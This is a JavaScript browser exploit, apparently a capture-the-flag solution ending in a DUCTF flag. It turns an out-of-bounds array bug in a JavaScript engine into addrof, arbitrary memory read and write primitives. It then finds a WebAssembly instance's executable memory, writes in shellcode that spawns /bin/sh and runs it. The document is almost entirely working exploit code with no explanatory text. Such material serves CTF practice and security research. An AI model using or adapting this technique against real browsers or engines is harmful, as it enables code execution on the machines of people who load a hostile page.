let oob, oob_rw, base, idx, obj_map, bint_map;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

function ftoi(val) {
  f64_buf[0] = val;
  return u64_buf[0];
}

function itof(val) {
  u64_buf[0] = val;
  return f64_buf[0];
}

function setup() {
  oob = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6].slice(4, 5);
  oob_rw = new BigUint64Array([
    0x1111111122222222n,
    0x1111111122222222n,
    0x1111111122222222n,
  ]);

  for (let index = 0; index < 0x100; index++) {
    if (oob[index] === itof(0x1111111122222222n)) {
      idx = index;
      break;
    }
  }

  //   set array length
  oob[idx + 6] = itof(0xffffffffn);
  oob[idx + 7] = itof(0xffffffffn);

  //   external_pointer
  base = BigInt(ftoi(oob[idx + 8])) & 0xffffffff00000000n;

  // maps are fixed
  obj_map = base + 0x824394dn;
  bint_map = base + 0x8242665n;
}

function addrof(obj) {
  oob[idx + 3] = itof(obj_map);
  oob_rw[0] = obj;
  oob[idx + 3] = itof(bint_map);
  return base + (oob_rw[0] & 0xffffffffn);
}

function read(addr) {
  oob[idx + 8] = itof(addr);
  oob[idx + 9] = itof(0n);

  return oob_rw[0];
}

function write(addr, val) {
  oob[idx + 8] = itof(addr);
  oob[idx + 9] = itof(0n);

  oob_rw[0] = val;
}

function write_bytes(addr, bytes) {
  while (bytes.length % 8) bytes.push(0);
  let a = new BigUint64Array(new Uint8Array(bytes).buffer);
  a.forEach((v, i) => {
    write(addr + 8n * BigInt(i), v);
  });
}

setup();

// prettier-ignore
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,16,11,11,146,128,128,128,0,1,0,65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports.hello;

wasm_mod_addr = addrof(wasm_mod);
rwx = read(wasm_mod_addr - 1n + 8n * 13n);

// prettier-ignore
// pwn shellcraft amd64.linux.sh
let shellcode = [0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5];
write_bytes(rwx, shellcode);
f();

// DUCTF{y0u_4r3_a_futUR3_br0ws3r_pwn_pr0d1gy!!}
